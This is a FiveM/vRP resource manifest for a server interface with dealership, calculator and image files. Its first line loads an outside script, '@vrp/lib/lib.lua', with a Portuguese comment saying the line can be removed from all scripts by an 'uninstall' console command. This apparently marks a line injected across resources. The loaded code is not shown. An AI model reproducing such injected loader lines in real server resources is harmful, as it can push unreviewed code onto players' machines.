client_script "@vrp/lib/lib.lua" --Para remover esta pendencia de todos scripts, execute no console o comando "uninstall"

resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page "nui/index.html"

client_script {
	"@vrp/lib/utils.lua",
	"client.lua"
}

files {
	"nui/images/background.png",
	"nui/jquery.js",
	"nui/css.css",
	"nui/concessionaria/index.html",
	"nui/concessionaria/css/pixel.css",
	"nui/concessionaria/js/pixel.css",
	"nui/acoes/*.jpg",
	"nui/calculadora/*.html",
	"nui/calculadora/*.css",
	"nui/*.html",
}              